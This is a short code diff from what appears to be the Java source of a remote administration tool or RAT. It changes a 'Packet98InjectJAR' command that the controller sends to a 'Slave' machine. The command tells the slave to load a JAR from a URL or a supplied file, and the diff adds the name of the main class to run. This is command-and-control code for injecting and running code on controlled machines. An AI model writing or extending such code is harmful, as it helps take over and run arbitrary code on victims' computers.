@@ -10,17 +10,22 @@ public class Packet98InjectJAR extends AbstractOutgoingPacket {
 
 	private String url;
 	private File file;
+	private String mainClass;
 	
-	public Packet98InjectJAR(String url) {
+	public Packet98InjectJAR(String url, String mainClass) {
 		this.url = url;
+		this.mainClass = mainClass;
 	}
 	
-	public Packet98InjectJAR(File file) {
+	public Packet98InjectJAR(File file, String mainClass) {
 		this.file = file;
+		this.mainClass = mainClass;
 	}
 	
 	@Override
 	public void write(Slave slave, DataOutputStream dos) throws Exception {
+		slave.writeLine(mainClass);
+		slave.writeBoolean(file == null);
 		if (file == null) {
 			slave.writeLine(url);
 		} else {
